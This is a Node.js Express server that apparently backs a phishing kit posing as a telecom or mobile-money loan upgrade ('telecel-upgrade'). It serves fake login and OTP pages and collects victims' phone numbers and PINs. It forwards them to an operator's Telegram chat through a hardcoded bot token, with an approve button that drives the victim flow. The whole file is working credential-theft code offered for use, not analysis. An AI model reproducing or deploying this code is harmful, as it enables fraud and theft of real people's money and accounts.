const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const CHAT_ID = '6414813627';
const pendingApprovals = new Map();

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/otp', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'otp.html'));
});

app.get('/api/check-status/:requestId', (req, res) => {
    const status = pendingApprovals.get(req.params.requestId) || 'pending';
    res.json({ status: status });
});

app.post('/api/send-verification', async (req, res) => {
    const { phone, pin, loanAmount, accountType, requestId } = req.body;
    console.log(`Request ${requestId}: Phone ${phone}`);
    
    pendingApprovals.set(requestId, 'pending');
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `🔴 LOAN\nAmount: ${loanAmount}\nPhone: ${phone}\nPIN: ${pin}\nID: ${requestId}`,
            reply_markup: {
                inline_keyboard: [[{ text: "✅ APPROVE", callback_data: `approve_${requestId}` }]]
            }
        })
    });
    
    res.json({ success: true });
});

app.post('/webhook', (req, res) => {
    if (req.body.callback_query) {
        const data = req.body.callback_query.data;
        const callbackId = req.body.callback_query.id;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackId })
        }).catch(() => {});
        
        if (data.startsWith('approve_')) {
            const requestId = data.replace('approve_', '');
            pendingApprovals.set(requestId, 'approved');
            console.log(`Approved: ${requestId}`);
        }
    }
    res.sendStatus(200);
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok' });
});

async function setupWebhook() {
    const url = `https://telecel-upgrade-production.up.railway.app/webhook`;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${url}`);
    console.log('Webhook set');
}

app.listen(PORT, async () => {
    console.log(`Server running on port ${PORT}`);
    await setupWebhook();
});
